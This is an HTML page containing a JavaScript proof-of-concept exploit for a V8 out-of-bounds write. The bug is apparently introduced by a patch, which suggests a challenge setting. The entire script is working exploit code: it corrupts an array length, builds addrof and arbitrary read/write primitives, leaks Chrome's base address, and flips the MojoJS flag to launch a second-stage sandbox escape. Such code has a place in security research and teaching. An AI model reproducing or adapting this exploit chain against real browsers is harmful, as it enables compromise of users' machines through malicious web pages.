<!DOCTYPE html>
<html>
    <body>
        <script>
// This POC exploits the out-of-bounds write introduced by v8_bug.patch in TypedArrayPrototypeSetTypedArray
// to enable mojo javascript bindings in the main browser process.
/**
 * Utils
 */
let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function() {
    return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function() {
    int_view[0] = this;
    return float_view[0];
}
Number.prototype.f2i = function() {
    float_view[0] = this;
    return int_view[0];
}

/**
 * Exploit
 */
function pwn()
{
    function make_primitives() {
        let y = new Uint32Array(1);
        let x = new Uint32Array(1);

        // we overwrite the length field of array z
        // to achieve out-of-bounds read
        let z = [1.1, 1.1, 1.1, 1.1];

        // this array will store objects for the
        // addrof primitive
        let arr_addrof = [{}];
        // this array is used to leak the high pointer
        // since it contains a full address
        let f_arr = new Float64Array(1);

        // copy 0x8888 into y
        // this is the array length size
        y.set([0x8888], 0);
	/*
	FIXME:
	If you get the console log
	   "[+] z.length = 4" and the error [1111/084949.241642:INFO:CONSOLE(58)] "Uncaught TypeError: Cannot read property 'f2i' of undefined", try changing the offset to 32
	*/
        // copy y into offset 33 which will
        // be the length field of array z. we overwrite
        // it with a large value like 0x8888 so we can
        // now perform out-of-bounds read.
        x.set(y, 33);
        console.log("[+] z.length = " + z.length);
        return [z, arr_addrof, f_arr];
    }

    let [z, arr_addrof, f_arr] = make_primitives();
    let heap_upper = z[28].f2i() & 0xffffffff00000000n;
    console.log("[+] heap_upper = " + heap_upper.hex());
    // we save the original TypedArray object's pointer
    // to restore it at the end and make the garbage
    // collector happy.
    let original_28 = z[28];
    let original_29 = z[29];

    function addrof(obj) {
        arr_addrof[0] = obj;
        // we use the out-of-bounds read from array z
        // to leak the address of our target object
        // stored in arr_addrof
        return (z[7].f2i() & 0xffffffffn) - 1n;
    }
    function aar64(addr) {
        // overwrite 32-bits of the pointer
        z[28] = ((addr & 0xffffffff00000000n) | 7n).i2f();
        // overwrite the next 32-bits of the pointer
        z[29] = (((addr - 8n) | 1n) & 0xffffffffn).i2f();
        // arbitrary address read using the full pointer
        // we overwrote in the TypedArray object.
        return f_arr[0].f2i();
    }
    function aaw64(addr, value) {
        // overwrite 32-bits of the pointer
        z[28] = ((addr & 0xffffffff00000000n) | 7n).i2f();
        // overwrite the next 32-bits of the pointer
        z[29] = (((addr - 8n) | 1n) & 0xffffffffn).i2f();
        // arbitrary address write using the full pointer
        // we overwrote in the TypedArray object.
        f_arr[0] = value.i2f();
    }
    function cleanup() {
        // restore the original TypedArray object's
        // pointer to make the garbage collector happy.
        z[28] = original_28;
        z[29] = original_29;
    }

    /* Leak chrome base. 
    * Use the high pointer leak and the addrof primitive to obtain the address of the div object.
    * Pass the address to the arbitrary-address-read to obtain a chrome memory address.
    * Subtract the offset of the memory address to compute the chrome base address.
    */
    let div = document.createElement('div');
    let addr_div = heap_upper | addrof(div);
    console.log("[+] addr_div = " + addr_div.hex());
    let addr_HTMLDivElement = aar64(addr_div + 0xCn);
    console.log("[+] <HTMLDivElement> = " + addr_HTMLDivElement.hex());
    let chrome_base = addr_HTMLDivElement - 0xc1bb7c0n;
    console.log("[+] chrome_base = " + chrome_base.hex());

    /* Enable MojoJS 
    * Add the offset for the mojo variable to the leaked chrome base.
    * Use the arbitrary-address-write to flip the bits in the flag.
    */
    console.log("[+] Overwriting flags..");
    let addr_flag_MojoJS = chrome_base + 0xc560f0en;
    aaw64(addr_flag_MojoJS & 0xfffffffffffffff8n, 0x0101010101010101n);

    /* Cleanup */
    cleanup();

    // Reload the web-page to execute the next stage of the full-chain-exploit.
    window.location.href = "./2-browser-exploit.html";
}

console.log("[+] Renderer exploit!");
pwn();
        </script>
    </body>
</html>
